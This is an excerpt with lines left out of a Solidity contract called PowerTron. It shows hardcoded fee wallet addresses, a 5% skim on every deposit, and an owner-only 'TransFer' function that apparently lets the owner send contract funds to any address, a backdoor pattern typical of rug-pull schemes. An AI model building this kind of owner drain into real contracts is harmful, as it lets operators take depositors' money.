...
contract PowerTron {
    ...
    address payable public promotion_fee;
    ...
    constructor(address payable _owner) public {
        ...
        promotion_fee = 0xfFF67246535850F821D2026DC3aCDE980b187622;
        admin_fee = 0x99Da2Ca5C2Fd04A1187B1fCe62EE15c66aC4B590;
    ...
    function _deposit(address _addr, uint256 _amount) private {
        ...
        promotion_fee.transfer(_amount * 5 / 100);
        
    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 35 / 1000;
    ...
    function withdraw() external {
     ...
     function TransFer(address payable _address, uint _amount) public  returns(bool){
        require(msg.sender == owner,"Transfer");
